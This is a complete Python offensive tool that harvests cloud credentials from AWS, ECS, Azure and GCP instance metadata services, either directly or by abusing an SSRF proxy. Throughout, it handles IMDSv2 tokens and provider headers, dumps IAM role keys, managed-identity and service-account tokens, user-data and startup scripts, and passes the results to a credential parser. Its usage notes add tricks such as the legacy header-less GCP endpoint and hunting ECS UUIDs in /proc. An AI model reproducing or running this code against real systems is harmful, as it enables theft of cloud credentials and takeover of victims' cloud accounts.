#!/usr/bin/env python3
"""Steal cloud credentials from the metadata service (direct or via SSRF proxy).

Pure stdlib (urllib). Given a provider (aws|ecs|azure|gcp) and either direct
network reach to the metadata IP or an SSRF proxy URL template, this fetches the
credential endpoints — handling the AWS IMDSv2 PUT-token dance and the required
Azure/GCP headers — plus the high-value extras (user-data, identity document,
startup-script, recursive dump), saves every raw response, and delegates to
parse_metadata_creds.py to emit credentials.json, work-units.json, assets.json.

Direct (on the box, or metadata IP port-forwarded):
  python3 scripts/metadata_pivot.py --provider aws -o out/
  python3 scripts/metadata_pivot.py --provider azure --resource https://vault.azure.net -o out/
  python3 scripts/metadata_pivot.py --provider gcp -o out/
  python3 scripts/metadata_pivot.py --provider ecs --cred-uri /v2/credentials/0123abcd-... -o out/

Via SSRF ({url} is replaced by the URL-encoded metadata URL; headers/PUT cannot
be sent through a plain SSRF, so AWS falls back to IMDSv1 automatically and
Azure/GCP are attempted but will fail unless the proxy forwards headers —
pass --header to add headers the proxy DOES forward):
  python3 scripts/metadata_pivot.py --provider aws --ssrf 'https://app.example.com/fetch?u={url}' -o out/
"""
import argparse
import json
import os
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

AWS_BASE = "http://169.254.169.254"
ECS_BASE = "http://169.254.170.2"
GCP_BASE = "http://metadata.google.internal"
AZ_BASE = "http://169.254.169.254"


class Fetcher:
    def __init__(self, ssrf_template=None, extra_headers=None, timeout=8):
        self.ssrf = ssrf_template
        self.extra = extra_headers or {}
        self.timeout = timeout

    def fetch(self, url, headers=None, method="GET", data=None):
        """Return (status, body_str) or (None, error_str)."""
        hdrs = dict(self.extra)
        if headers:
            hdrs.update(headers)
        if self.ssrf:
            # the SSRF proxy fetches for us; method/headers depend on the proxy
            real = self.ssrf.replace("{url}", urllib.parse.quote(url, safe=""))
            req = urllib.request.Request(real, headers=hdrs)
        else:
            req = urllib.request.Request(url, headers=hdrs, method=method,
                                         data=data)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode("utf-8", "replace")
            except Exception:
                return e.code, ""
        except Exception as e:
            return None, "ERR:%s" % e


def grab(f, store, url, headers=None, method="GET", label=None):
    st, body = f.fetch(url, headers=headers, method=method)
    store["responses"][label or url] = {"url": url, "status": st, "body": body}
    ok = st is not None and 200 <= st < 300
    sys.stderr.write("[%s] %s %s\n" % ("+" if ok else "-", st, url))
    return body if ok else None


def pivot_aws(f, store):
    base = store["base"]
    token = None
    if not f.ssrf:  # PUT impossible through a plain GET SSRF
        st, body = f.fetch(base + "/latest/api/token", method="PUT",
                           headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
        if st and 200 <= st < 300 and body and not body.startswith("ERR:"):
            token = body.strip()
            sys.stderr.write("[+] IMDSv2 token obtained\n")
    h = {"X-aws-ec2-metadata-token": token} if token else {}
    roles = grab(f, store, base + "/latest/meta-data/iam/security-credentials/", h)
    if roles:
        for role in roles.split():
            grab(f, store, base + "/latest/meta-data/iam/security-credentials/" + role,
                 h, label="aws-credentials:" + role)
    grab(f, store, base + "/latest/user-data", h, label="aws-user-data")
    grab(f, store, base + "/latest/dynamic/instance-identity/document", h,
         label="aws-identity-doc")
    grab(f, store, base + "/latest/meta-data/iam/info", h, label="aws-iam-info")
    grab(f, store, base + "/latest/meta-data/hostname", h, label="aws-hostname")


def pivot_ecs(f, store, cred_uri):
    rel = cred_uri or os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
    full = os.environ.get("AWS_CONTAINER_CREDENTIALS_FULL_URI")
    if rel:
        grab(f, store, ECS_BASE + rel, label="aws-credentials:ecs-task-role")
    elif full:
        h = {}
        tf = os.environ.get("AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE")
        if tf and os.path.exists(tf):
            h["Authorization"] = open(tf).read().strip()
        grab(f, store, full, h, label="aws-credentials:ecs-task-role")
    else:
        sys.stderr.write("[-] no --cred-uri and no AWS_CONTAINER_CREDENTIALS_* env; "
                         "hunt the UUID in /proc/*/environ or debug pages\n")
    v4 = os.environ.get("ECS_CONTAINER_METADATA_URI_V4")
    if v4:
        grab(f, store, v4 + "/task", label="ecs-task-metadata")


def pivot_azure(f, store, resource, client_id):
    base = store["base"]
    q = {"api-version": "2018-02-01", "resource": resource}
    if client_id:
        q["client_id"] = client_id
    url = base + "/metadata/identity/oauth2/token?" + urllib.parse.urlencode(q)
    grab(f, store, url, {"Metadata": "true"}, label="azure-token:" + resource)
    grab(f, store, base + "/metadata/instance?api-version=2021-02-01",
         {"Metadata": "true"}, label="azure-instance")
    grab(f, store,
         base + "/metadata/instance/compute/userData?api-version=2021-02-01&format=text",
         {"Metadata": "true"}, label="azure-user-data")


def pivot_gcp(f, store):
    base = store["base"]
    h = {"Metadata-Flavor": "Google"}
    b = base + "/computeMetadata/v1"
    sas = grab(f, store, b + "/instance/service-accounts/", h) or "default/"
    for sa in {s.strip("/") for s in sas.split() if s.strip()}:
        grab(f, store, "%s/instance/service-accounts/%s/token" % (b, sa), h,
             label="gcp-token:" + sa)
        grab(f, store, "%s/instance/service-accounts/%s/email" % (b, sa), h,
             label="gcp-email:" + sa)
        grab(f, store, "%s/instance/service-accounts/%s/scopes" % (b, sa), h,
             label="gcp-scopes:" + sa)
    grab(f, store, b + "/instance/attributes/startup-script", h,
         label="gcp-startup-script")
    grab(f, store, b + "/?recursive=true&alt=json", h, label="gcp-recursive")
    # legacy header-less endpoint — works through plain SSRF on old instances
    grab(f, store,
         base + "/computeMetadata/v1beta1/instance/service-accounts/default/token",
         label="gcp-token-v1beta1")


def main():
    p = argparse.ArgumentParser(
        description="Fetch cloud metadata credentials (direct or via SSRF) and "
                    "emit rupu work units.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("--provider", required=True,
                   choices=["aws", "ecs", "azure", "gcp"])
    p.add_argument("--base", default=None,
                   help="override metadata base URL (e.g. http://192.0.2.5:8080 "
                        "when port-forwarded)")
    p.add_argument("--ssrf", default=None,
                   help="SSRF proxy template containing {url}, e.g. "
                        "'https://app.example.com/fetch?u={url}'")
    p.add_argument("--header", action="append", default=[],
                   help="extra 'Name: value' header (repeatable) — e.g. headers "
                        "the SSRF proxy forwards upstream")
    p.add_argument("--resource", default="https://management.azure.com/",
                   help="Azure token audience (default ARM; try "
                        "https://graph.microsoft.com/, https://vault.azure.net)")
    p.add_argument("--client-id", default=None,
                   help="Azure: pick a specific user-assigned identity")
    p.add_argument("--cred-uri", default=None,
                   help="ECS: credentials relative URI (/v2/credentials/<uuid>)")
    p.add_argument("--timeout", type=int, default=8)
    p.add_argument("-o", "--out", default="out", help="output dir (default: out)")
    args = p.parse_args()

    extra = {}
    for hv in args.header:
        k, _, v = hv.partition(":")
        extra[k.strip()] = v.strip()
    f = Fetcher(args.ssrf, extra, args.timeout)

    defaults = {"aws": AWS_BASE, "ecs": ECS_BASE, "azure": AZ_BASE, "gcp": GCP_BASE}
    store = {"provider": args.provider,
             "base": (args.base or defaults[args.provider]).rstrip("/"),
             "via_ssrf": bool(args.ssrf),
             "responses": {}}

    if args.provider == "aws":
        pivot_aws(f, store)
    elif args.provider == "ecs":
        pivot_ecs(f, store, args.cred_uri)
    elif args.provider == "azure":
        pivot_azure(f, store, args.resource, args.client_id)
    elif args.provider == "gcp":
        pivot_gcp(f, store)

    os.makedirs(args.out, exist_ok=True)
    raw_path = os.path.join(args.out, "metadata-raw.json")
    with open(raw_path, "w") as fh:
        json.dump(store, fh, indent=2)
        fh.write("\n")
    sys.stderr.write("[*] raw responses -> %s\n" % raw_path)

    parser = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "parse_metadata_creds.py")
    sys.exit(subprocess.call([
        sys.executable, parser, raw_path,
        "-o", os.path.join(args.out, "work-units.json"),
        "--creds", os.path.join(args.out, "credentials.json"),
        "--assets", os.path.join(args.out, "assets.json")]))


if __name__ == "__main__":
    main()
